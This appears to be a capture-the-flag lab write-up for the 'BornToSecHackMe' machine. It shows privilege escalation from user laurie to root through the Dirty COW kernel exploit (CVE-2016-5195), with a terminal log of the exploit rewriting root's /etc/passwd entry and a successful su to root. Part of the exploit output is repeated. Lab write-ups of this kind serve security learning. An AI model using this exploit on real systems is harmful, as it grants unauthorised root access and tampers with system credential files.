
The same steps as mandatory are taken to reach laurie shell over ssh.

Logging in to laurie with ssh, while inspecting the kernel version we find it is vulnerable to dirtycow CVE-2016-5195.
We found a public exploit source, compiled and run it, taking the new root password in the command line argument after finishing we can log in as root with the new password.

```
laurie@BornToSecHackMe:~$ ./dirty 123
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 123
Complete line:
root:fiRbwOlRgkx7g:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password '123'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password '123'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
laurie@BornToSecHackMe:~$ su root
Password: 
root@BornToSecHackMe:/home/laurie# ls /root
README
```